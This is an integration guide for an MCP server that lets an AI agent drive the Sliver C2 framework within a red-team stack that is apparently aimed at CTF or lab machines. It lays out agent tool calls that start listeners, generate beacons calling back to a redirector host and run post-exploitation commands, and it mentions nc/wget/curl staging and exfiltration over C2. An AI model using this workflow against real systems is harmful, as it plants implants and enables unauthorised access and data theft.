# dagar-red integration

`sliver-mcp` is the C2 leg of the dagar-red MCP stack (p0rtix → metasploit →
sliver). The skills already declare `mcp: [sliver]`; this wires the tools they
were written to call.

## Registration

`~/.claude.json`:

```json
"sliver": {
  "type": "stdio",
  "command": "/home/youruser/projects/sliver-mcp/venv/bin/sliver-mcp",
  "args": [],
  "env": { "SLIVER_CONFIG": "/home/youruser/.sliver-client/configs/dagar.cfg" }
}
```

No `.mcp.json` is needed — dagar-red references MCP tools by name
(`mcp__sliver__*`), and `sliver` is already in `scripts/lint_skills.py`'s MCP
enum, so no validator change is required.

## sliver-ops MCP-driven loop

The `sliver-ops` skill's CLI block becomes:

```text
1. mcp__sliver__connect()
2. mcp__sliver__set_noise("yellow")
3. mcp__sliver__start_https_listener(host="0.0.0.0", port=443, domain="<redirector>")
4. mcp__sliver__generate_beacon(c2_host="<redirector>", os="windows",
                                interval=60, jitter=30)   # deliver via payload-delivery
5. mcp__sliver__poll_events()        # watch for the callback
6. mcp__sliver__list_sessions()
7. mcp__sliver__execute_command(target_id, "whoami")      # drive post-ex
8. mcp__sliver__export_handoff()      # feed internal-dispatch
```

**Port 443 is the standing-pool standard.** Every HTTPS listener and pool build
defaults to port **443**, not 4443 — `start_https_listener`, `generate_beacon` /
`generate_implant` / `regenerate_or_build`, and `ingest_handoff` all target 443
when no `port` / `c2_port` is given. Keep the ~5-build standing pool on 443 so a
reused `pool-https-<osarch>` build always calls back on the same port; a build
that drifted to 4443 (generated before this standard) should be evicted with
`remove_implant_build` and rebuilt against 443.

## Cross-tool handoff

`export_handoff()` returns the same shape family as p0rtix's, so the agent can
fold C2 state back into `internal-dispatch`. `ingest_handoff(handoff_data)`
consumes a p0rtix/metasploit-style handoff (keys: `redirector` /
`callback_domain` / `domain` / `lhost` / `host` / `hosts`, plus `protocol`,
`port`, `os`, `arch`) and stands up a matching listener + beacon in one call —
the recon→C2 pivot.

## Operating model: tool split and beacon-before-flags gate

### p0rtix vs Sliver — where each tool starts

| Action | Tool |
|---|---|
| Network scan, service enum, banner grab | p0rtix |
| Passive AD reads (nxc, ldapsearch, Kerberoast from attack box) | p0rtix |
| Any interactive shell or RCE (WinRM, webshell, SSH, command injection) | Sliver — deliver beacon immediately |
| Post-exploitation (file ops, creds, lateral) | Sliver (via session/beacon) |
| Privilege escalation, flag collection | Sliver session — after check-in confirmed |

**The boundary is the first interactive shell.** The moment any RCE or shell is
available, transition to Sliver beacon delivery. Valid creds that only enable
passive reads (e.g. ldap bind, SMB enumeration) stay in p0rtix; the same creds
that enable a WinRM/SSH session go to Sliver. The delivery step itself may use
nc / wget / curl as a staging primitive, but Sliver check-in must be confirmed
before any post-exploitation work begins.

### Beacon-before-flags gate

**No privesc or flag collection until a Sliver beacon has checked in.**

The correct sequence after initial access:

```
1. exploit / initial RCE obtained
2. deliver beacon (wget + nohup setsid, or Win32_Process.Create — see delivery.md)
3. mcp__sliver__poll_events()   # wait for check-in
4. mcp__sliver__list_sessions() # confirm the beacon is live
# only now:
5. privesc / flag collection via execute_command / download
```

Collecting flags via a raw shell (SSH, pexpect, webshell) before Sliver is
established is the wrong pattern even when the path is trivial (sudo, SUID,
default creds). The reason Sliver is established is to exercise the full stack
(listener + pool + sliver-mcp post-ex), not only because post-exploitation is
complex.

If Sliver cannot be delivered (FreeBSD, Go runtime constraint, no egress), note
the reason explicitly (`sliver_skipped: <reason>`) in the engagement record and
fall back to whatever shell mechanism works. But skip should be an explicit
decision, not a default path.

> **Skill-side enforcement note:** The `sliver-ops` / `internal-dispatch` skill
> chain in dagar-red is the canonical enforcement point for this gate. The
> writeup's "Post-Access: C2 (Sliver)" section being empty is the signal that
> the beacon step was missed. Future writeup agents should treat an empty C2
> section as a flag requiring a `sliver_skipped` explanation, not a valid state.

## Related skills

`c2-tradecraft` (doctrine), `payload-delivery` (beacon delivery — see
[`delivery.md`](delivery.md) for session-safe Windows/Linux detachment),
`session-pivoting` (pivots — note the SOCKS/portfwd limitation in the README),
`collection-exfil` (download over the C2 channel), and
`loader-injection-tradecraft` (in-memory stage) all compose with these tools.
